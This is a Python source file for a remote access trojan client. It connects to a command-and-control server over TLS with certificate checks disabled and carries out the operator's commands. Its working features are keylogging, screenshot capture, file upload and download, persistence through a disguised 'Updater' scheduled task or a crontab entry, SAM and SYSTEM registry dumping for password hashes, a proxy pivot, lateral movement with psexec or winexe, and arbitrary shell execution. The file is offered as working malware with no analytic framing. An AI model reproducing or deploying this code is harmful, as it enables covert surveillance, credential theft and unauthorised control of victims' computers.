# client.py
import socket
import ssl
import subprocess
import threading
import os
from io import BytesIO
from base64 import b64encode
from PIL import ImageGrab
from pynput.keyboard import Listener
import platform

C2_HOST = '192.168.38.186'
C2_PORT = 4444

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
secure_sock = context.wrap_socket(sock, server_hostname=C2_HOST)
secure_sock.connect((C2_HOST, C2_PORT))

# === KEYLOGGER ===
key_buffer = []

def log_key(key):
    try:
        key_buffer.append(str(key.char))
    except AttributeError:
        key_buffer.append(f"<{key.name}>")

threading.Thread(target=lambda: Listener(on_press=log_key).run(), daemon=True).start()

# === SCREENSHOT ===
def capture_screenshot():
    try:
        img = ImageGrab.grab()
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        return buffer.getvalue()
    except:
        return None

# === SEND FILE ===
def send_file(sock, file_path):
    try:
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sock.sendall(chunk)
        sock.send(b'[EOF]')
    except Exception as e:
        sock.send(f"[!] Error sending file: {str(e)}[EOF]".encode())

# === RECEIVE FILE ===
def receive_file(sock, file_path):
    try:
        with open(file_path, 'wb') as f:
            while True:
                data = sock.recv(4096)
                if data.endswith(b'[EOF]'):
                    f.write(data[:-5])
                    break
                f.write(data)
        sock.send(b"[+] File received successfully[END]")
    except Exception as e:
        sock.send(f"[!] Error receiving file: {str(e)}[END]".encode())

# === PRIVILEGE CHECK ===
def check_privs():
    try:
        if os.name == 'nt':
            out = subprocess.check_output('whoami /priv', shell=True, stderr=subprocess.STDOUT)
            return out.decode()
        else:
            out = subprocess.check_output('sudo -l', shell=True, stderr=subprocess.STDOUT)
            return out.decode()
    except Exception as e:
        return f"[!] Priv check error: {str(e)}"

# === PERSISTENCE ===
def install_persistence():
    try:
        path = os.path.abspath(__file__)
        if os.name == 'nt':
            cmd = f'schtasks /create /tn "Updater" /tr "{path}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, check=True)
        else:
            cron = f"@reboot python3 {path} &\n"
            with open("/tmp/.cron", "w") as f:
                f.write(cron)
            os.system("crontab /tmp/.cron")
        return "[+] Persistence installed"
    except Exception as e:
        return f"[-] Persistence failed: {str(e)}"

# === HASH DUMP (Windows only) ===
def dump_hashes():
    try:
        if os.name != 'nt':
            return "[-] SAM hash dump only supported on Windows"
        cmd = "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM sys.save"
        subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return "[+] SAM & SYSTEM registry saved for offline hash extraction"
    except Exception as e:
        return f"[-] Hash dump failed: {str(e)}"

# === PROXY SETUP ===
def setup_proxy(local_port, target_host, target_port):
    def relay(src, dst):
        while True:
            try:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
            except:
                break

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(('0.0.0.0', int(local_port)))
        listener.listen(5)
        secure_sock.send(b"[+] Proxy listening\n[END]")
        while True:
            client_sock, _ = listener.accept()
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((target_host, int(target_port)))
            threading.Thread(target=relay, args=(client_sock, target_sock)).start()
            threading.Thread(target=relay, args=(target_sock, client_sock)).start()

# === LATERAL MOVE ===
def lateral_move(target_ip, user, password):
    try:
        path = os.path.abspath(__file__)
        if os.name == 'nt':
            cmd = f"psexec \\\\{target_ip} -u {user} -p {password} -d python {path}"
        else:
            cmd = f"winexe -U {user}%{password} //{target_ip} 'python3 {path}'"
        subprocess.Popen(cmd, shell=True)
        return f"[+] Attempted lateral movement to {target_ip}"
    except Exception as e:
        return f"[-] Lateral move failed: {str(e)}"

# === SHELL LOOP ===
def shell_loop():
    while True:
        try:
            cmd = secure_sock.recv(1024).decode().strip()
            if cmd == "exit":
                break
            elif cmd.startswith("download "):
                file_path = cmd.split(" ", 1)[1]
                send_file(secure_sock, file_path)
            elif cmd.startswith("upload "):
                file_path = cmd.split(" ", 1)[1]
                receive_file(secure_sock, file_path)
            elif cmd == "screenshot":
                img = capture_screenshot()
                if img:
                    secure_sock.sendall(img + b'[EOF]')
                else:
                    secure_sock.sendall(b"[!] Screenshot failed[EOF]")
            elif cmd == "keylog":
                logs = ''.join(key_buffer)
                secure_sock.sendall(logs.encode() + b'[END]')
            elif cmd == "checkprivs":
                output = check_privs()
                secure_sock.sendall(output.encode() + b'[END]')
            elif cmd == "persist":
                msg = install_persistence()
                secure_sock.sendall(msg.encode() + b'[END]')
            elif cmd == "dump_hashes":
                msg = dump_hashes()
                secure_sock.sendall(msg.encode() + b'[END]')
            elif cmd.startswith("move "):
                _, ip, user, pw = cmd.split()
                msg = lateral_move(ip, user, pw)
                secure_sock.sendall(msg.encode() + b'[END]')
            elif cmd.startswith("proxy "):
                _, local_port, target_host, target_port = cmd.split()
                threading.Thread(target=setup_proxy, args=(local_port, target_host, target_port), daemon=True).start()
            else:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                secure_sock.sendall(output + b'[END]')
        except Exception as e:
            secure_sock.sendall(f"[!] Error: {str(e)}[END]".encode())

shell_loop()
secure_sock.close()
